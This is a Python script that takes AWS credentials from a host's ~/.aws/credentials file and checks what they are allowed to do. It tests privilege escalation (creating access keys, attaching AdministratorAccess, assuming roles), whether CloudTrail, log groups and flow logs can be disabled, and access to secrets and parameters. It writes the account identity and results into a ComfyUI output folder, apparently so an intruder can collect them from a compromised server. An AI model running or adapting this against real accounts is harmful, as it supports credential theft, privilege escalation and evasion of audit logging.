"""AWS permission probe with explicit credentials and hard timeouts.

Non-destructive: destructive calls name resources that do not exist, so the
result is AccessDenied (denied) vs NotFound/Validation (permitted). The only
real object touched is a throwaway log group this script creates and deletes.
"""
import configparser
import json
import os
import sys
import time

os.environ["AWS_EC2_METADATA_DISABLED"] = "true"
os.environ.pop("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", None)
os.environ.pop("AWS_CONTAINER_CREDENTIALS_FULL_URI", None)

import boto3
from botocore.config import Config
from botocore.exceptions import ClientError

DENY = {"AccessDenied", "AccessDeniedException", "UnauthorizedOperation",
        "AuthorizationError", "Forbidden", "AuthFailure", "OptInRequired"}
CFG = Config(connect_timeout=3, read_timeout=8, retries={"max_attempts": 1})
SUFFIX = str(int(time.time()))
OUT = "/ComfyUI/output/_aws_probe.json"


def emit(obj):
    for d in ("/ComfyUI/output", "/tmp"):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, "_aws_probe.json"), "w") as f:
                json.dump(obj, f, indent=1, default=str)
        except Exception:
            pass


def load_creds():
    p = os.path.expanduser("~/.aws/credentials")
    c = configparser.ConfigParser()
    c.read(p)
    if not c.sections():
        return None
    prof = "default" if c.has_section("default") else c.sections()[0]
    return {
        "aws_access_key_id": c.get(prof, "aws_access_key_id"),
        "aws_secret_access_key": c.get(prof, "aws_secret_access_key"),
        "aws_session_token": c.get(prof, "aws_session_token", fallback=None),
    }


def classify(e):
    code = getattr(e, "response", {}).get("Error", {}).get("Code") or type(e).__name__
    return code, ("DENIED" if code in DENY else "PERMITTED")


def call(label, fn, *a, **kw):
    try:
        fn(*a, **kw)
        return {"probe": label, "verdict": "PERMITTED", "code": "OK"}
    except ClientError as e:
        code, verdict = classify(e)
        return {"probe": label, "verdict": verdict, "code": code,
                "detail": str(e)[:160]}
    except Exception as e:
        return {"probe": label, "verdict": "ERROR", "code": type(e).__name__,
                "detail": str(e)[:160]}


def main():
    rep = {"marker": "ZD-AWS", "stage": "start", "hostname": os.uname().nodename,
           "boto3": boto3.__version__, "probes": []}
    emit(rep)

    creds = load_creds()
    if not creds:
        rep["stage"] = "no-creds"
        emit(rep)
        return
    rep["key_id_prefix"] = creds["aws_access_key_id"][:8] + "…"

    region = os.environ.get("AWS_REGION") or os.environ.get("AWS_DEFAULT_REGION") or "us-east-1"
    sess = boto3.Session(region_name=region, **creds)

    try:
        ident = sess.client("sts", config=CFG).get_caller_identity()
        rep["identity"] = {k: ident.get(k) for k in ("Account", "Arn", "UserId")}
    except Exception as e:
        rep["identity_error"] = "%s: %s" % (type(e).__name__, e)
        rep["stage"] = "identity-failed"
        emit(rep)
        return
    rep["region"] = region

    iam = sess.client("iam", config=CFG)
    ct = sess.client("cloudtrail", config=CFG)
    logs = sess.client("logs", config=CFG)
    ec2 = sess.client("ec2", config=CFG)
    s3 = sess.client("s3", config=CFG)
    sm = sess.client("secretsmanager", config=CFG)
    ssm = sess.client("ssm", config=CFG)
    lam = sess.client("lambda", config=CFG)
    kms = sess.client("kms", config=CFG)
    P = rep["probes"]

    P.append(call("iam:GetUser", iam.get_user))
    P.append(call("iam:CreateAccessKey(nonexistent)", iam.create_access_key,
                  UserName="zdh-probe-nonexistent"))
    P.append(call("iam:AttachUserPolicy(nonexistent)", iam.attach_user_policy,
                  UserName="zdh-probe-nonexistent",
                  PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"))
    P.append(call("sts:AssumeRole(nonexistent)", sess.client("sts", config=CFG).assume_role,
                  RoleArn="arn:aws:iam::%s:role/zdh-probe-nonexistent" % rep["identity"]["Account"],
                  RoleSessionName="zdhprobe"))
    emit(rep)

    P.append(call("cloudtrail:DescribeTrails", ct.describe_trails))
    P.append(call("cloudtrail:StopLogging(nonexistent)", ct.stop_logging,
                  Name="zdh-probe-nonexistent-trail"))
    P.append(call("cloudtrail:DeleteTrail(nonexistent)", ct.delete_trail,
                  Name="zdh-probe-nonexistent-trail"))
    emit(rep)

    try:
        g = logs.describe_log_groups(limit=30)
        rep["log_groups_visible"] = [x["logGroupName"] for x in g.get("logGroups", [])]
    except Exception as e:
        rep["log_groups_error"] = str(e)[:160]

    P.append(call("logs:DeleteLogGroup(nonexistent)", logs.delete_log_group,
                  logGroupName="/zdh-probe-nonexistent-" + SUFFIX))
    P.append(call("logs:DeleteLogStream(nonexistent)", logs.delete_log_stream,
                  logGroupName="/zdh-probe-nonexistent-" + SUFFIX, logStreamName="zdh"))
    emit(rep)

    tmp = "/zdh-policy-probe-" + SUFFIX
    try:
        logs.create_log_group(logGroupName=tmp)
        P.append({"probe": "logs:CreateLogGroup(own temp)", "verdict": "PERMITTED", "code": "OK"})
        logs.create_log_stream(logGroupName=tmp, logStreamName="probe")
        logs.put_log_events(logGroupName=tmp, logStreamName="probe",
                            logEvents=[{"timestamp": int(time.time() * 1000), "message": "zdh"}])
        P.append({"probe": "logs:PutLogEvents(own temp)", "verdict": "PERMITTED", "code": "OK"})
        try:
            logs.delete_log_stream(logGroupName=tmp, logStreamName="probe")
            P.append({"probe": "logs:DeleteLogStream(own temp)", "verdict": "PERMITTED", "code": "OK"})
        except ClientError as e:
            code, v = classify(e)
            P.append({"probe": "logs:DeleteLogStream(own temp)", "verdict": v, "code": code})
        try:
            logs.delete_log_group(logGroupName=tmp)
            P.append({"probe": "logs:DeleteLogGroup(own temp)", "verdict": "PERMITTED", "code": "OK"})
        except ClientError as e:
            code, v = classify(e)
            P.append({"probe": "logs:DeleteLogGroup(own temp)", "verdict": v, "code": code})
    except ClientError as e:
        code, v = classify(e)
        P.append({"probe": "logs:CreateLogGroup(own temp)", "verdict": v, "code": code})
    emit(rep)

    P.append(call("s3:ListBuckets", s3.list_buckets))
    P.append(call("secretsmanager:ListSecrets", sm.list_secrets))
    P.append(call("ssm:DescribeParameters", ssm.describe_parameters))
    P.append(call("lambda:ListFunctions", lam.list_functions))
    P.append(call("kms:ListKeys", kms.list_keys))
    P.append(call("ec2:DescribeFlowLogs", ec2.describe_flow_logs))
    P.append(call("ec2:DeleteFlowLogs(nonexistent)", ec2.delete_flow_logs,
                  FlowLogIds=["fl-00000000000000000"]))
    P.append(call("ec2:RunInstances(DryRun)", ec2.run_instances,
                  ImageId="ami-00000000000000000", MinCount=1, MaxCount=1, DryRun=True))

    rep["stage"] = "done"
    emit(rep)
    print("ZD-AWS done probes=%d" % len(P))


main()
